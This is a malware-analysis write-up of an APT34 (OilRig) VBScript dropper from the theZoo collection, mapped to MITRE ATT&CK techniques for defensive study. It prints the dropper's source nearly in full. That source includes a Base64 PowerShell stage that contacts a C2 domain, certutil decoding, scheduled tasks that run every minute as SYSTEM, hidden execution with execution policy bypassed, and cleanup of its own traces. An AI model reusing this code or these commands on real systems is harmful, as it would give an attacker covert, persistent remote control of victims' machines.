# Finding 10: APT34 PoisonFrog Dropper - Scheduled Task with VBScript

## Metadata
- **Repository**: theZoo-master
- **File Path**: `malware/Binaries/Win32.VBS.APT34Dropper/Win32.VBS.APT34Dropper/Win32.VBS.APT34Dropper`
- **Language**: VBScript
- **Malware Family**: APT34 (OilRig) PoisonFrog Dropper
- **APT Group**: APT34 (Iranian state-sponsored)

## Code Snippet

```vbscript
Dim oFSO
Dim oShell
Set oShell = WScript.CreateObject ("WScript.Shell")
Set oFSO = CreateObject("Scripting.FileSystemObject")
Dim objFso
Set objFso = WScript.CreateObject("Scripting.FileSystemObject")

' Create directory structure
If Not objFso.FolderExists("C:\ProgramData\Windows") Then
  objFso.CreateFolder "C:\ProgramData\Windows"
End If
If Not objFso.FolderExists("C:\ProgramData\Windows\Microsoft") Then
  objFso.CreateFolder "C:\ProgramData\Windows\Microsoft"
End If
If Not objFso.FolderExists("C:\ProgramData\Windows\Microsoft\java") Then
  objFso.CreateFolder "C:\ProgramData\Windows\Microsoft\java"
End If 

' Drop VBScript payload
if Not objFso.FileExists("C:\ProgramData\Windows\Microsoft\java\GoogleUpdateschecker.vbs") Then
    outFile = "C:\ProgramData\Windows\Microsoft\java\GoogleUpdateschecker.vbs"
    Set objFile = objFSO.CreateTextFile(outFile,True)
    objFile.Write "set Shell0 = CreateObject(""wscript.shell"")" & vbCrLf & _
                  "Shell0.run ""powershell.exe -exec bypass -file C:\ProgramData\Windows\Microsoft\java\hUpdateCheckers.ps1 "", 0, false" & vbCrLf & _
                  "command1 = ""Powershell.exe -exec bypass -file C:\ProgramData\Windows\Microsoft\java\dUpdateCheckers.ps1""" & vbCrLf & _
                  "set Shell1 = CreateObject(""wscript.shell"")" & vbCrLf & _
                  "shell1.run command1, 0, false" 
    objFile.Close
End If

' Drop Base64-encoded PowerShell payloads
if Not objFso.FileExists("C:\ProgramData\Windows\Microsoft\java\hUpdateCheckers.base") Then
    code2 = "JHtnbG9iYWw6JHdjfSA9IG5ldy1vYmplY3Qgc3lzdGVtLm5ldC5XZWJDbGllbnQNCiR7Z2xvYmFsOiR3Y30ucHJveHkgPSBbU3lzdGVtLk5ldC5XZWJQcm94eV06OkdldERlZmF1bHRQcm94eSgpDQokcnZyID0gImh0dHA6Ly8iICsgW1N5c3RlbS5OZXQuRG5zXTo6R2V0SG9zdEFkZHJlc3Nlcygid3d3Lm11bWJhaS1tLnNpdGUiKSArIi91cGRhdGVfd2FwcDIuYXNweCINCiRpcCA9IEdldC1XbWlPYmplY3QgLXF1ZXJ5ICJzZWxlY3QgKiBmcm9tIFdpbjMyX05ldHdvcmtBZGFwdGVyQ29uZmlndXJhdGlvbiB3aGVyZSBJUEVuYWJsZWQgPSAkdHJ1ZSIgfCAley..."
    outFile2 = "C:\ProgramData\Windows\Microsoft\java\hUpdateCheckers.base"
    Set objFile2 = objFSO.CreateTextFile(outFile2,True)
    objFile2.Write code2
    objFile2.Close
End If

' Create batch file with scheduled task commands
if Not objFso.FileExists("C:\ProgramData\Windows\Microsoft\java\cUpdateCheckers.bat") Then
    ' *** SCHEDULED TASK CREATION - LINE 37 ***
    code4 = "@schtasks /create /F /sc minute /mo 1 /tn ""\UpdateTasks\JavaUpdates"" /tr ""wscript /b ""C:\ProgramData\Windows\Microsoft\java\GoogleUpdateschecker.vbs""""NEXTLINE" & _
            "@schtasks /create /F /sc minute /RU ""SYSTEM"" /mo 1 /tn ""\UpdateTasks\JavaUpdates"" /tr ""wscript /b ""C:\ProgramData\Windows\Microsoft\java\GoogleUpdateschecker.vbs"""""
    code4 = Replace(code4, "NEXTLINE", vbCrLf)
    outFile4 = "C:\ProgramData\Windows\Microsoft\java\cUpdateCheckers.bat"
    Set objFile4 = objFSO.CreateTextFile(outFile4,True)
    objFile4.Write code4
    objFile4.Close
    
    ' Decode Base64 payloads
    oShell.run "cmd.exe /C certutil -f -decode C:\ProgramData\Windows\Microsoft\java\dUpdateCheckers.base C:\ProgramData\Windows\Microsoft\java\dUpdateCheckers.ps1", 0, false
    oShell.run "cmd.exe /C certutil -f -decode C:\ProgramData\Windows\Microsoft\java\hUpdateCheckers.base C:\ProgramData\Windows\Microsoft\java\hUpdateCheckers.ps1", 0, false
    
    ' Execute scheduled task creation
    oShell.run "cmd.exe /C C:\ProgramData\Windows\Microsoft\java\cUpdateCheckers.bat", 0, false
    
    ' Execute payload
    oShell.run "cmd.exe /C wscript /b C:\ProgramData\Windows\Microsoft\java\GoogleUpdateschecker.vbs", 0, false
    
    WScript.Sleep(5000)
    
    ' Cleanup
    oShell.run "cmd.exe /C del C:\ProgramData\Windows\Microsoft\java\cUpdateCheckers.bat", 0, false		
    oShell.run "cmd.exe /C del C:\ProgramData\Windows\Microsoft\java\*.base", 0, false
End If
```

## Analysis

**What it does:**
This is an APT34 (OilRig) dropper that establishes persistence through scheduled tasks. The VBScript dropper creates a sophisticated multi-stage payload delivery system with scheduled task persistence, then cleans up installation artifacts. APT34 is an Iranian state-sponsored threat group known for targeting Middle Eastern organizations.

**How it uses Windows Scheduled Tasks (T1053.005):**

The dropper creates TWO scheduled tasks with different configurations:

**Task 1 - User-level persistence:**
```batch
schtasks /create /F /sc minute /mo 1 /tn "\UpdateTasks\JavaUpdates" /tr "wscript /b C:\ProgramData\Windows\Microsoft\java\GoogleUpdateschecker.vbs"
```
- Schedule: Every 1 minute
- Task path: `\UpdateTasks\JavaUpdates` (custom folder)
- Runs as: Current user
- Executes: VBScript with `/b` (suppress dialogs)

**Task 2 - SYSTEM-level persistence:**
```batch
schtasks /create /F /sc minute /RU "SYSTEM" /mo 1 /tn "\UpdateTasks\JavaUpdates" /tr "wscript /b C:\ProgramData\Windows\Microsoft\java\GoogleUpdateschecker.vbs"
```
- Schedule: Every 1 minute
- Task path: Same as Task 1 (overwrites)
- Runs as: SYSTEM (highest privileges)
- Executes: Same VBScript payload

**Evasion/Stealth Techniques:**

1. **Masquerading as Java/Google updates:**
   - Task name: `JavaUpdates` in `\UpdateTasks\` folder
   - File name: `GoogleUpdateschecker.vbs`
   - Path: `C:\ProgramData\Windows\Microsoft\java\` (mimics Java installation)

2. **Multi-stage payload delivery:**
   - VBScript dropper → Batch file → VBScript payload → PowerShell stages
   - Base64-encoded PowerShell scripts decoded via `certutil`
   - Multiple layers hide true payload

3. **Hidden execution:**
   - All commands use window style `0` (hidden)
   - VBScript executed with `/b` flag (suppress error dialogs)

4. **Artifact cleanup:**
   - Deletes batch file after execution
   - Removes `.base` encoded files after decoding
   - Leaves only necessary persistence files

5. **DNS-based C2:**
   - PowerShell payloads use DNS subdomain encoding for C2 communication
   - C2 domain: `mumbai-m.site` (encoded in Base64 payload)

6. **Execution bypass:**
   - PowerShell: `-exec bypass` to avoid execution policy restrictions

**Attack Chain:**
```
VBScript Dropper
    ↓
Create directory structure (C:\ProgramData\Windows\Microsoft\java\)
    ↓
Drop GoogleUpdateschecker.vbs (VBScript launcher)
    ↓
Drop Base64-encoded PowerShell payloads (.base files)
    ↓
Create batch file with schtasks commands
    ↓
Execute batch → Creates 2 scheduled tasks (user + SYSTEM)
    ↓
Decode Base64 payloads using certutil
    ↓
Execute VBScript payload
    ↓
Cleanup: Delete batch and .base files
    ↓
Persistence: Tasks run every minute, launching PowerShell backdoors
```

**APT34 Context:**
APT34 (OilRig/Helix Kitten) is known for:
- Targeting energy, financial, and government sectors
- Middle East focus (particularly UAE, Saudi Arabia, Qatar)
- Custom tools: BONDUPDATER, POWBAT, QUADAGENT
- DNS tunneling and PowerShell backdoors
- Living-off-the-land techniques

This dropper demonstrates APT34's sophistication:
- Multi-stage delivery
- Legitimate-looking persistence
- Aggressive persistence (every minute, dual tasks)
- Built-in cleanup mechanisms
- DNS-based C2 obfuscation

**PowerShell Payload Functions:**
The decoded PowerShell scripts provide:
- `hUpdateCheckers.ps1`: HTTP/DNS C2 communication
- `dUpdateCheckers.ps1`: DNS-based command polling
- WebClient for file download/upload
- Command execution capabilities

**MITRE ATT&CK Mapping:**
- **T1053.005**: Scheduled Task/Job: Scheduled Task (Primary - dual tasks)
- **T1059.001**: Command and Scripting Interpreter: PowerShell
- **T1059.005**: Command and Scripting Interpreter: Visual Basic
- **T1140**: Deobfuscate/Decode Files or Information (certutil Base64)
- **T1027**: Obfuscated Files or Information (Base64 encoding)
- **T1036.005**: Masquerading: Match Legitimate Name or Location (Java/Google names)
- **T1071.004**: Application Layer Protocol: DNS (C2 communication)
- **T1070.004**: Indicator Removal on Host: File Deletion (cleanup)
- **T1548.002**: Abuse Elevation Control Mechanism: Bypass User Account Control (SYSTEM execution)
